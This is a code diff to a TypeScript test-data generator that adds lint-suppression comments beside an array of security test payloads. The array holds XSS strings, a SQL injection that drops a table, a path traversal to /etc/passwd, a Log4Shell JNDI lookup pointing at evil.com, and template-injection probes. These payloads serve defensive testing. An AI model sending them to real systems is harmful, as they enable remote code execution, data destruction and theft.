@@ -118,10 +118,12 @@ export class TestDataGenerator {
       '"><script>alert("XSS")</script>',
       "'; DROP TABLE consumers;--",
       "../../../etc/passwd",
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: Security test payload
       "${jndi:ldap://evil.com/a}",
       "%00",
       "\x00",
       "{{7*7}}",
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: Security test payload
       "${7*7}",
       '<img src=x onerror=alert("XSS")>',
     ];
